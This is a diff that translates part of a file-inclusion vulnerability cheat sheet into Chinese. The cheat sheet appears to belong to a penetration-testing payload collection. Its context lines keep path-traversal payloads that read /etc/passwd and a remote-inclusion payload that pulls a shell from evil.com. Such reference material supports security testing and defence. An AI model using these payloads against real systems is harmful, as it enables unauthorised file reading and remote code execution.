@@ -1,4 +1,4 @@
-# 文件包含
+# 文件包含(include)
 
 > 文件包含漏洞使攻击者可以包含文件，通常利用目标应用程序中实现的“动态文件包含”机制
 
@@ -13,7 +13,7 @@
     * [UTF-8编码](#UTF-8编码)
     * [路径与.截断](#路径与.截断)
     * [filter绕过技巧](#filter绕过技巧)
-* [Basic RFI](#basic-rfi)
+* [基本的远程文件包含](#基本的远程文件包含)
 * [LFI / RFI using wrappers](#lfi--rfi-using-wrappers)
   * [Wrapper php://filter](#wrapper-phpfilter)
   * [Wrapper zip://](#wrapper-zip)
@@ -83,10 +83,8 @@ http://example.com/index.php?page=..///////..////..//////etc/passwd
 http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
 ```
 
-## Basic RFI
-
-Most of the filter bypasses from LFI section can be reused for RFI.
-
+## 基本的远程文件包含
+基本的本地文件过滤绕过技巧大多数可以用于远程文件包含
 ```powershell
 http://example.com/index.php?page=http://evil.com/shell.txt
 ```
